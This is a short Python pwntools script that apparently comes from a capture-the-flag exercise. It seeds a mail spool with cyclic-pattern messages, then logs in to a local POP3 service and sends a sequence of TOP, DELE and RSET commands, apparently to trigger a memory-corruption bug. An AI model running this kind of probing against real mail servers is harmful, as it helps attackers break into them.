import pwn
import hashlib

def sendmail(f, t, d):
    data = "From: %s%sTo %s%s%s" % (f, "\r\n", t, "\r\n\r\n", d)
    h = hashlib.sha256(data).hexdigest()
    f = open('/tmp/mails/foo/%s' % h, 'w')
    f.write(data)
    f.close()

for i in range(10):
    sendmail('q3k@dragonsector.pl', 'foo@insomni.hack', ('%i'%i + pwn.cyclic(200)+'\r\n')*20)

USERNAME = 'foo'
PASSWORD = 'bar'

s = pwn.remote('localhost', 42110)

nonce = s.recvline().split('<')[1].split('>')[0]
h = hashlib.sha256('<{}>{}'.format(nonce, PASSWORD)).hexdigest()
s.send('APOP {} {}\n'.format(USERNAME, h))
print '[d]', s.recvline(),

def list():
    s.send('LIST\n')
    line = s.recvline()
    count = line.split()[1]
    for _ in range(int(count)):
        print '[d]', s.recvline(),

list()

s.send('TOP 0 10\n')
print '[d]', s.recvuntil('\r\n.\r\n')

s.send('DELE 0\n')
print '[d]', s.recvline(),
s.send('DELE 1\n')
print '[d]', s.recvline(),

s.send('RSET\n')
print '[d]', s.recvline(),

s.send('TOP 2 2\n')
print '[d]', s.recvuntil('\r\n.\r\n')
s.send('TOP 1 2\n')
print '[d]', s.recvuntil('\r\n.\r\n')
